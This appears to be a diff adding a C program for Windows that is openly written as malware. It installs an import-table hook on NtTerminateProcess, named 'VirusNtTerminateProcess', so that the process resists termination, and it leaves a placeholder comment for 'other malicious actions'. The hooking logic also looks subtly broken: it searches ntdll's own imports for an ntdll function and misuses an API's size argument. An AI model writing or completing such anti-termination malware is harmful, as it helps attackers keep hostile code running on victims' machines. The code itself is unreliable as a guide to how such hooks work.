@@ -1,0 +1,56 @@
+#include <Windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS (NTAPI* FN_NtTerminateProcess)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
+FN_NtTerminateProcess OriginalNtTerminateProcess;
+
+NTSTATUS NTAPI VirusNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
+    if (ProcessHandle == GetCurrentProcess()) {
+        return STATUS_ACCESS_DENIED;
+    }
+    return OriginalNtTerminateProcess(ProcessHandle, ExitStatus);
+}
+
+BOOL HookNtTerminateProcess() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) {
+        return FALSE;
+    }
+
+    OriginalNtTerminateProcess = (FN_NtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");
+    if (!OriginalNtTerminateProcess) {
+        return FALSE;
+    }
+
+    DWORD oldProtect;
+    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(hNtdll, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &oldProtect);
+    if (!pImportDesc) {
+        return FALSE;
+    }
+    while (pImportDesc->Name) {
+        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)hNtdll + pImportDesc->FirstThunk);
+        while (pThunk->u1.Function) {
+            if (pThunk->u1.Function == (ULONG_PTR)OriginalNtTerminateProcess) {
+                DWORD dwOldProtect;
+                VirtualProtect(&pThunk->u1.Function, sizeof(pThunk->u1.Function), PAGE_EXECUTE_READWRITE, &dwOldProtect);
+                pThunk->u1.Function = (ULONG_PTR)VirusNtTerminateProcess;
+                VirtualProtect(&pThunk->u1.Function, sizeof(pThunk->u1.Function), dwOldProtect, &dwOldProtect);
+                return TRUE;
+            }
+            pThunk++;
+        }
+        pImportDesc++;
+    }
+    return FALSE;
+}
+
+int main() {
+    if (!HookNtTerminateProcess()) {
+        //Handle error
+    }
+    // Do other malicious actions here
+
+    // Wait for the user to close the program
+    system("pause");
+    return 0;
+}
